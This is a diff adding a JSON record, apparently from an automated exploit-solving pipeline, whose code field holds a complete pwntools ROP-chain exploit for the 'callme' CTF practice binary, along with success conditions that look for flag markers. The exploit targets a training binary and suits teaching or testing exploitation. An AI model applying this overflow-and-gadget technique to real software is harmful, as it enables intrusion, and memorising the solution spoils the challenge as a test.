@@ -1,0 +1,7 @@
+{
+  "strategy": "heuristic_callme",
+  "code": "import argparse\nimport re\nfrom pwn import ELF, context, p64, process\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"binary\", nargs=\"?\", default=None)\n    parser.add_argument(\"--binary\", dest=\"binary_flag\", default=None)\n    args = parser.parse_args()\n    binary = args.binary_flag or args.binary\n    if not binary:\n        raise SystemExit(\"missing binary path\")\n\n    elf = ELF(binary, checksec=False)\n    context.binary = elf\n\n    a = 0xdeadbeefdeadbeef\n    b = 0xcafebabecafebabe\n    c = 0xd00df00dd00df00d\n\n    gadget = elf.symbols[\"usefulGadgets\"]\n    payload = b\"A\" * 40\n    for fn in (\"callme_one\", \"callme_two\", \"callme_three\"):\n        payload += p64(gadget)\n        payload += p64(a)\n        payload += p64(b)\n        payload += p64(c)\n        payload += p64(elf.symbols[fn])\n\n    io = process(binary)\n    io.sendline(payload)\n    output = io.recvall(timeout=2).decode(errors=\"replace\")\n    print(output)\n\n    if re.search(r\"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b\", output):\n        return\n    raise SystemExit(1)\n\n\nif __name__ == \"__main__\":\n    main()\n",
+  "success_conditions": "Send extracted candidate input and observe WIN/FLAG markers.",
+  "raw_text": "heuristic_pre_llm_attempt",
+  "used_format_repair": false
+}
